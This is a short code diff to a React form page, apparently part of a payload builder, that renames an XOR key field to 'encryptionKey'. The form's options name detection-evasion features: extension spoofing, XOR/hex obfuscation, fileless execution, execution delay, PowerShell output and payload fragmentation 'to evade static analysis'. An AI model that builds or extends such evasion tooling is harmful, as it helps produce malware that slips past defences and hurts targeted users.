@@ -29,7 +29,7 @@ const formSchema = z.object({
   outputFormat: z.string(),
   extensionSpoofing: z.boolean().default(false),
   obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
-  xorKey: z.string().optional(),
+  encryptionKey: z.string().optional(),
   useFragmentation: z.boolean().default(false),
   executionDelay: z.string().optional(),
   fileless: z.boolean().default(true),
@@ -69,7 +69,7 @@ export default function MergingStationPage() {
       outputFormat: 'ps1',
       extensionSpoofing: false,
       obfuscationType: 'none',
-      xorKey: 'netrax',
+      encryptionKey: 'netrax',
       useFragmentation: false,
       executionDelay: '',
       fileless: true,
@@ -273,7 +273,7 @@ export default function MergingStationPage() {
                             )}
                         />
                          {watchObfuscationType === 'xor' && (
-                            <FormField control={form.control} name="xorKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
+                            <FormField control={form.control} name="encryptionKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
                          )}
                          <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription></div></FormItem> )}/>
                     </CardContent>
